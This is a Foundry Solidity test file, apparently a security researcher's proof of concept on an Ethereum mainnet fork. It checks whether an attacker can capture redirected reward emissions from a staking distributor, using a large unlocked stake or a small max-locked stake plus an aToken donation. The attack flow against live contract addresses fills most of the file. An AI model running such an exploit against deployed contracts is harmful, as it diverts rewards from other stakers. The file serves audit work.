// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test} from "forge-std/Test.sol";

interface IERC20 { function balanceOf(address) external view returns (uint256); function transfer(address,uint256) external returns(bool); function approve(address,uint256) external returns(bool); }
interface IDistrib {
    function distributeRewards(uint256) external;
    function minRewardsDistributePeriod() external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function depositPools(uint256,address) external view returns (address,string memory,uint256,uint256,uint256,uint8,address,bool);
}
interface IAavePool { function supply(address,uint256,address,uint16) external; }
interface ICL { function getPathId(string memory) external pure returns (bytes32); function getChainLinkDataFeedLatestAnswer(bytes32) external view returns (uint256); }
interface IDepositPool {
    function stake(uint256,uint256,uint128,address) external;
    function getLatestUserReward(uint256,address) external view returns (uint256);
    function getCurrentUserMultiplier(uint256,address) external view returns (uint256);
}

// Does LOCKING let an attacker capture the donation-redirected emission with far LESS principal?
// Compare accrued reward for: (A) large unlocked stake vs (B) small max-locked stake, same donation.
contract LockEfficiency is Test {
    IDistrib constant D = IDistrib(0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A);
    IAavePool constant AAVE = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IDepositPool constant WBTC_POOL = IDepositPool(0xdE283F8309Fd1AA46c95d299f6B8310716277A42);
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant CL = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;
    uint128 constant MAX_LOCK_END = 2211192000; // periodEnd (Jan 2040) = max lock multiplier
    address[5] POOLS = [0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790,0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384,0xdE283F8309Fd1AA46c95d299f6B8310716277A42,0x6cCE082851Add4c535352f596662521B4De4750E,0x3B51989212BEdaB926794D6bf8e9E991218cf116];

    function _fresh() internal {
        for (uint256 i;i<5;i++){ (, string memory p,,,,,,bool e)=D.depositPools(0,POOLS[i]); if(!e)continue; bytes32 id=ICL(CL).getPathId(p); uint256 px=ICL(CL).getChainLinkDataFeedLatestAnswer(id); vm.mockCall(CL,abi.encodeWithSelector(ICL.getChainLinkDataFeedLatestAnswer.selector,id),abi.encode(px)); }
    }

    function _run(uint256 stakeAmt, uint128 lockEnd, uint256 donateAmt) internal returns (uint256 accrued, uint256 mult) {
        address atk = makeAddr(string(abi.encodePacked("atk", vm.toString(stakeAmt), vm.toString(lockEnd))));
        deal(WBTC, atk, stakeAmt);
        vm.startPrank(atk); IERC20(WBTC).approve(address(D), type(uint256).max);
        WBTC_POOL.stake(0, stakeAmt, lockEnd, address(0)); vm.stopPrank();
        mult = WBTC_POOL.getCurrentUserMultiplier(0, atk);

        uint128 lc = D.rewardPoolLastCalculatedTimestamp(0);
        uint256 tgt = uint256(lc) + D.minRewardsDistributePeriod() + 100;
        if (block.timestamp < tgt) vm.warp(tgt);
        _fresh();

        deal(WBTC, atk, donateAmt);
        vm.startPrank(atk); IERC20(WBTC).approve(address(AAVE), donateAmt); AAVE.supply(WBTC, donateAmt, atk, 0);
        (, , , , , , address aW, ) = D.depositPools(0, POOLS[2]);
        IERC20(aW).transfer(address(D), IERC20(aW).balanceOf(atk)); vm.stopPrank();
        D.distributeRewards(0);
        accrued = WBTC_POOL.getLatestUserReward(0, atk);
    }

    function test_A_large_unlocked() public {
        vm.createSelectFork(vm.envOr("ETH_RPC", string("https://ethereum-rpc.publicnode.com")), 25996939); _fresh();
        (uint256 acc, uint256 m) = _run(200_000_000, 0, 1_200_000); // 2 wBTC unlocked
        emit log_named_uint("A: stake wBTC(8dec)", 200_000_000);
        emit log_named_uint("A: multiplier(1e25)", m);
        emit log_named_uint("A: accrued MOR", acc);
    }
    function test_B_small_maxlock() public {
        vm.createSelectFork(vm.envOr("ETH_RPC", string("https://ethereum-rpc.publicnode.com")), 25996939); _fresh();
        (uint256 acc, uint256 m) = _run(20_000_000, MAX_LOCK_END, 1_200_000); // 0.2 wBTC max-locked
        emit log_named_uint("B: stake wBTC(8dec)", 20_000_000);
        emit log_named_uint("B: multiplier(1e25)", m);
        emit log_named_uint("B: accrued MOR", acc);
    }
}
